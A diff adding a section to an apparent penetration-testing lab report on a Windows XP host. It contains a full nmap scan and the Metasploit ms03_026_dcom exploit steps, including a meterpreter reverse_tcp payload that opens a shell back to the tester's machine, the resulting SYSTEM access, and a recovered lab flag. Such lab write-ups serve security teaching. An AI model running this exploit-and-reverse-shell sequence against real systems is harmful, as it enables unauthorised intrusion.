@@ -1,1 +1,123 @@
 \section*{Host 3: 192.168.233.106}
+\par Firstly, we use the command \textit{nmap -s -A -p1-1024 192.168.233.106}  to scan open ports and get the results below:
+\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
+security@BB:~$ sudo nmap -v -A -p1-1024 192.168.233.106
+[sudo] password for security: 
+
+Starting Nmap 6.40 ( http://nmap.org ) at 2014-03-04 21:07 CET
+NSE: Loaded 110 scripts for scanning.
+NSE: Script Pre-scanning.
+Initiating Ping Scan at 21:07
+Scanning 192.168.233.106 [4 ports]
+Completed Ping Scan at 21:07, 0.01s elapsed (1 total hosts)
+Initiating Parallel DNS resolution of 1 host. at 21:07
+Completed Parallel DNS resolution of 1 host. at 21:07, 0.03s elapsed
+Initiating SYN Stealth Scan at 21:07
+Scanning 192.168.233.106 [1024 ports]
+Discovered open port 445/tcp on 192.168.233.106
+Discovered open port 135/tcp on 192.168.233.106
+Discovered open port 139/tcp on 192.168.233.106
+Completed SYN Stealth Scan at 21:07, 0.35s elapsed (1024 total ports)
+Initiating Service scan at 21:07
+Scanning 3 services on 192.168.233.106
+Completed Service scan at 21:07, 6.12s elapsed (3 services on 1 host)
+Initiating OS detection (try #1) against 192.168.233.106
+Retrying OS detection (try #2) against 192.168.233.106
+Retrying OS detection (try #3) against 192.168.233.106
+Retrying OS detection (try #4) against 192.168.233.106
+Retrying OS detection (try #5) against 192.168.233.106
+Initiating Traceroute at 21:07
+Completed Traceroute at 21:07, 0.01s elapsed
+Initiating Parallel DNS resolution of 2 hosts. at 21:07
+Completed Parallel DNS resolution of 2 hosts. at 21:07, 0.01s elapsed
+NSE: Script scanning 192.168.233.106.
+Initiating NSE at 21:07
+Completed NSE at 21:07, 1.90s elapsed
+Nmap scan report for 192.168.233.106
+Host is up (0.0079s latency).
+Not shown: 1021 closed ports
+PORT    STATE SERVICE      VERSION
+135/tcp open  msrpc        Microsoft Windows RPC
+139/tcp open  netbios-ssn
+445/tcp open  microsoft-ds Microsoft Windows XP microsoft-ds
+No exact OS matches for host (If you know what OS is running on it, see http://nmap.org/submit/ ).
+TCP/IP fingerprint:
+OS:SCAN(V=6.40%E=4%D=3/4%OT=135%CT=1%CU=36328%PV=Y%DS=2%DC=T%G=Y%TM=5316329
+OS:E%P=i686-pc-linux-gnu)SEQ(SP=80%GCD=1%ISR=9D%TI=I%CI=I%II=I%SS=S%TS=0)OP
+OS:S(O1=M538NW0NNT00NNS%O2=M538NW0NNT00NNS%O3=M538NW0NNT00%O4=M538NW0NNT00N
+OS:NS%O5=M538NW0NNT00NNS%O6=M538NNT00NNS)WIN(W1=FAF0%W2=FAF0%W3=FAF0%W4=FAF
+OS:0%W5=FAF0%W6=FAF0)ECN(R=Y%DF=Y%T=80%W=FAF0%O=M538NW0NNS%CC=N%Q=)T1(R=Y%D
+OS:F=Y%T=80%S=O%A=S+%F=AS%RD=0%Q=)T2(R=Y%DF=N%T=80%W=0%S=Z%A=S%F=AR%O=%RD=0
+OS:%Q=)T3(R=Y%DF=Y%T=80%W=FAF0%S=O%A=S+%F=AS%O=M538NW0NNT00NNS%RD=0%Q=)T4(R
+OS:=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T5(R=Y%DF=N%T=80%W=0%S=Z%A=S+%F=
+OS:AR%O=%RD=0%Q=)T6(R=Y%DF=N%T=80%W=0%S=A%A=O%F=R%O=%RD=0%Q=)T7(R=Y%DF=N%T=
+OS:80%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=80%IPL=38%UN=0%RIPL=G%RID=
+OS:G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=S%T=80%CD=Z)
+
+Network Distance: 2 hops
+TCP Sequence Prediction: Difficulty=130 (Good luck!)
+IP ID Sequence Generation: Incremental
+Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| nbstat: 
+|   NetBIOS name: CL1, NetBIOS user: <unknown>, NetBIOS MAC: 00:0c:29:bc:e8:06 (VMware)
+|   Names
+|     CL1<00>              Flags: <unique><active>
+|     POETSCAFE<00>        Flags: <group><active>
+|     CL1<03>              Flags: <unique><active>
+|     CL1<20>              Flags: <unique><active>
+|_    POETSCAFE<1e>        Flags: <group><active>
+| smb-os-discovery: 
+|   OS: Windows XP (Windows 2000 LAN Manager)
+|   OS CPE: cpe:/o:microsoft:windows_xp::-
+|   Computer name: CL1
+|   NetBIOS computer name: CL1
+|   Domain name: poetscafe.local
+|   Forest name: poetscafe.local
+|   FQDN: CL1.poetscafe.local
+|   NetBIOS domain name: POETSCAFE
+|_  System time: 2014-03-04T22:09:28+01:00
+| smb-security-mode: 
+|   Account that was used for smb scripts: guest
+|   User-level authentication
+|   SMB Security: Challenge/response passwords supported
+|_  Message signing disabled (dangerous, but default)
+|_smbv2-enabled: Server doesn't support SMBv2 protocol
+
+TRACEROUTE (using port 554/tcp)
+HOP RTT     ADDRESS
+1   9.80 ms 10.11.12.1
+2   7.44 ms 192.168.233.106
+
+NSE: Script Post-scanning.
+Read data files from: /usr/bin/../share/nmap
+OS and Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 19.00 seconds
+           Raw packets sent: 1118 (52.738KB) | Rcvd: 1110 (46.626KB)
+\end{lstlisting}
+We found that the server use Microsoft Windows RPC service on port 135 and considered using this service as a breakthrough.TODOTODO: theoetical
+\begin{itemize}
+	\item sudo msfconsole
+	\item \lstinline{use exploit/windows/dcerpc/ms03_026_dcom}
+	\item set RHOST 192.168.233.106
+	\item \lstinline{set payload windows/meterpreter/reverse_tcp}
+	\item set LHOST 10.11.12.29
+	\item run
+\end{itemize}
+After we ran the exploit, it started sending exploit and showed the information below:
+\par \begin{lstlisting}[language=sh,numbers=left,numberstyle=\tiny,columns=fullflexible,basicstyle=\footnotesize\ttfamily, breaklines=true, breakautoindent=true, breakindent=4em]
+[*] Started reverse handler on 10.11.12.29:4444 
+[*] Trying target Windows NT SP3-6a/2000/XP/2003 Universal...
+[*] Binding to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.233.106[135] ...
+[*] Bound to 4d9f4ab8-7d1c-11cf-861e-0020af6e7c57:0.0@ncacn_ip_tcp:192.168.233.106[135] ...
+[*] Sending exploit ...
+[*] Sending stage (752128 bytes) to 192.168.233.106
+[*] Meterpreter session 1 opened (10.11.12.29:4444 -> 192.168.233.106:1183) at 2014-03-04 21:13:04 +0100
+\end{lstlisting}
+\par Now we can use meterpreter command now. We type \textit{getuid} and get \lstinline{NT AUTHORITY\SYSTEM}, which means that we've got the root access.
+\par After that, we use the command \textit{search -f secret.txt} and found the file. We opened the file and it showed that the code needed to be included in the report is COUDHc7QeD6sk.
+
+
+
+
